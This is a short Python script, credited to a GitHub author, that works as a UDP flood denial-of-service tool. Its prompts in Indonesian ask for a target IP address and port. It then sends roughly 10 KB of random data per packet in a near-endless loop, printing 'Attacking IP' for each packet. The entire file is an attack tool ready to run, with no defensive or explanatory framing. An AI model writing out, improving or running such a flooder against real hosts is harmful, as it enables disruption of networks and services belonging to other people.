from logging import error
import socket,random,time

banner = "======== SOURCE : github.com/Nofrisdan | Author : Nofrisdan Sitopu ========"
s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
print(banner)
ip = input("Masukkan IP Target : ")
port = int(input("Masukkan Port : "))
try :
    s.connect((ip,port))

    for i in range(1,100**1000):
        s.send(random._urandom(10)*1000)
        print(f"Attacking IP  : {ip} Port : {port} packet : {i}", end="\n")
        time.sleep(0.05)
except socket.error as error:
    print(f"Error IP {ip}:{port} => ", error)
    